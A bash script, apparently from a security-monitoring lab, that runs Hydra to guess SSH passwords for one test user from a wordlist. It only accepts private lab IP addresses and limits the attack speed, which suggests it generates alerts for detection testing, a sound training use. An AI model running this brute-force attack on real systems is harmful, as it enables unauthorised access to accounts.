
#!/usr/bin/env bash
# remember chmod +x scripts/attack_simulation.sh
set -Eeuo pipefail

TARGET="${UBUNTU_AGENT_IP:?Set UBUNTU_AGENT_IP first}"
TEST_USER="${SSH_TEST_USER:-soc-lab}"
WORDLIST="${1:?Usage: ./attack_simulation.sh WORDLIST}"

if [[ ! -f "$WORDLIST" || ! -r "$WORDLIST" ]]; then
    echo "[ERROR] Wordlist does not exist or is not readable."
    exit 1
fi

if ! command -v hydra >/dev/null 2>&1; then
    echo "[ERROR] Hydra is not installed."
    exit 1
fi

if ! [[ "$TARGET" =~ ^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.) ]]; then
    echo "[ERROR] Only private RFC1918 lab IP addresses are allowed."
    exit 1
fi

echo "[INFO] Target: $TARGET"
echo "[INFO] SSH user: $TEST_USER"
echo "[INFO] Wordlist: $WORDLIST"

hydra \
    -l "$TEST_USER" \
    -P "$WORDLIST" \
    -t 1 \
    -w 3 \
    "ssh://$TARGET"

echo "[INFO] Simulation finished."
